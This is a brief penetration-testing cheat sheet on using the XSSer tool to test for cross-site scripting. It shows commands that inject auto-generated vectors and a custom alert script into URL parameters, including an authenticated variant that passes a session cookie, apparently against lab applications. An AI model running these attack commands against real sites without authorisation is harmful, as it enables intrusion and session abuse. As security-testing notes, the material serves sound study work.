# XSSer

## XSS Attack

```bash

xsser --url "http://IP/index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" --auto
# --url: specific url
# -p: specific all requeste params (set value XSS to specify a param target)
# --auto: inject a list of vectors provided by XSSer

# custom payload
xsser --url "URL" -p "target_host=XSS" --Fp "<script>alert(1)</script>"
# --Fp: custom script 
```

## XSS Auth attack

{% code title="XSS Auth attack" %}
```bash
xsser --url "http://IP/htmli_get.php?firstname=XSS&lastname=tim&form=submit" --cookie="PHPSESSID=g7jm0fq3d80kpqea4ne78dk8v0; security_level=0"
# --cookie: specific cookie

xsser --url "http://IP/htmli_get.php?firstname=XSS&lastname=tim&form=submit" --cookie="PHPSESSID=g7jm0fq3d80kpqea4ne78dk8v0; security_level=0" --Fp "<script>alert(1)</script>"
 # --Fp: custom script 
```
{% endcode %}
